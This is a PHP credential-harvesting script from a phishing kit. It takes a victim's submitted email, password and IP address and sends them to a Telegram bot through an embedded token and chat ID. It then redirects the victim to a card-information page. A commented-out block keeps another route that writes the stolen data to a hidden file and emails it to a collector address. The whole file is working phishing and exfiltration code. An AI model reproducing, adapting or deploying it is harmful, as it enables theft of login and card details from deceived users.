<?php
include('antibot.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
session_start();
$ap_email       = $_SESSION['_ap_email_']        = $_POST['usere'];
$us_password     = $_SESSION['_us_password_']        = $_POST['password'];
$ip = getenv("REMOTE_ADDR");


$message = "LOGIN: " .$ap_email." | ";
$message .= "PASS: " .$us_password." | ";
$message .= "IP: ".$ip;

file_get_contents("https://api.telegram.org/bot6788401748:AAF1szjl3Y_1JyCF1MnTCmiBB9lpYgYGYRg/sendMessage?chat_id=-4064520154&text=".$message );
/*
$arr = array('funip' => $ip, 'funusr' => $ap_email, 'funpw' => $us_password  );
$XJUNO = json_encode($arr);

$file = fopen(".RzL.html","a");
fwrite($file, $XJUNO."</br>");
fclose($file);

$asba = "dskresult2021@gmail.com";
$subject  = "NEU DSKLOG OF " .$ip. " - [".$countryname."]";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:DSK <dskresult2021@gmail.com>";
mail($asba, $subject, $XJUNO, $headers);
*/
header("Location:cardinfof4e.php?$ip");
?>